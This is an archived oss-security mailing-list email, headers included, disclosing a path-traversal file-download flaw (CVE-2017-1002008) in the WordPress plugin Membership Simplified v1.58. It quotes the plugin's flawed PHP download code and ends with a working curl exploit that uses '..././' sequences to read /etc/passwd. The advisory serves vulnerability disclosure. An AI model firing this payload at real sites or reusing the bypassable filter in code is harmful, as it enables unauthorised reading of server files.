X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2342" "Tuesday" "14" "March" "2017" "16:33:34" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<59CD5258-22E2-46F1-83AF-EE4B78EFD88D@me.com>" "54" "[oss-security] Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58" "^Date:" nil nil "3" "2017031420:33:34" "[oss-security] Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58" (number mark "U       larry0@me.co Mar 14   54/2342  " thread-indent "\"[oss-security] Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 9373 invoked by uid 550); 14 Mar 2017 20:33:49 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 9355 invoked from network); 14 Mar 2017 20:33:48 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1489523616; bh=9KhqytiDrJxSf+c05pUkL8KaCvB7GotOKTXOHoIkR2A=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=ROLbHDpCm8r59202896bBbKDbtOBNKYmgQRbp6O8+XwjpeDZ+VZ/VAuYRS6kJjD/H
 rCED0To+cIXv6jNxOFFmIXbmfHpc/8ThvlSc/LBO57nSZWklRy/rgPcgmc9nzRCmW1
 bWBkDV0Ype9+e1gS15prBVx+u0Rl/YXpRWEEn42Tehh+jErBnyESX0atXThuxF7at8
 TOJuh1vu03F7Or2MYu1oyYhjjYXJyBPe+5ZwWUW7j8fs5+Bjf1VC67pqFOq3N8gqV4
 BHiDZJwQVYuIuogf9yS05RhyElbk5t/5IPq+oCho3BQ5dc7IWrAEoAQbSy91CdKKrh
 3/Ll6Hxhi4JfA==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-03-14_11:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1701120000 definitions=main-1703140157
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <59CD5258-22E2-46F1-83AF-EE4B78EFD88D@me.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Date: Tue, 14 Mar 2017 16:33:34 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Arbitrary file download vulnerability in Wordpress Plugin Membership
 Simplified v1.58
To: Open Source Security <oss-security@lists.openwall.com>

Title: Arbitrary file download vulnerability in Wordpress Plugin Membership=
 Simplified v1.58
Author: Larry W. Cashdollar, @_larry0
Date: 2017-03-13
CVE-ID:[CVE-2017-1002008]
Download Site: https://wordpress.org/plugins/membership-simplified-for-oap-=
members-only
Vendor: https://profiles.wordpress.org/williamdeangelis/
Vendor Notified: 2017-03-13
Vendor Contact: plugins@wordpress.org
Advisory: http://www.vapidlabs.com/advisory.php?v=3D187
Description: Membership Simplified allows you to generate membership lesson=
s with templated content to create a unified look and feel throughout your =
courses.
Vulnerability:
The file download code located membership-simplified-for-oap-members-only/d=
ownload.php does check whether a user is logged in and has download privled=
ges, the code on line 5 that checks the path can be defeated by using a ...=
/./ pattern to get the desired ../ after being passed through the str_repla=
ce() function:

 3 $path =3D substr(getcwd(), 0, -50). "uploads/membership-simplified-for-o=
ap-members-only/"; // change the path to fit your websites document structu=
re
  4 $fullPath =3D $path.$_GET['download_file'];
  5 $fullPath =3D str_replace("../","",$fullPath);
  6=20
  7 if ($fd =3D fopen($fullPath, "r")) {
  8     $fsize =3D filesize($fullPath);
  9     $path_parts =3D pathinfo($fullPath);
 10     $ext =3D strtolower($path_parts["extension"]);
 11     switch ($ext) {
 12         case "pdf":
 13         header("Content-type: application/pdf"); // add here more heade=
rs for d    iff. extensions
 14         header("Content-Disposition: attachment; filename=3D\"".$path_p=
arts["base    name"]."\""); // use 'attachment' to force a download
 15         break;
 16         default;
 17         header("Content-type: application/octet-stream");
 18         header("Content-Disposition: filename=3D\"".$path_parts["basena=
me"]."\"")    ;
 19     }
 20     header("Content-length: $fsize");
 21     header("Cache-control: private"); //use this to open files directly
 22     while(!feof($fd)) {
 23         $buffer =3D fread($fd, 2048);
 24         echo $buffer;

Exploit Code:
	=E2=80=A2 $ curl http://example.com/wordpress/wp-content/plugins/membershi=
p-simplified-for-oap-members-only/download.php?download_file=3D..././..././=
..././..././..././..././..././..././etc/passwd
	=E2=80=A2=20=20=
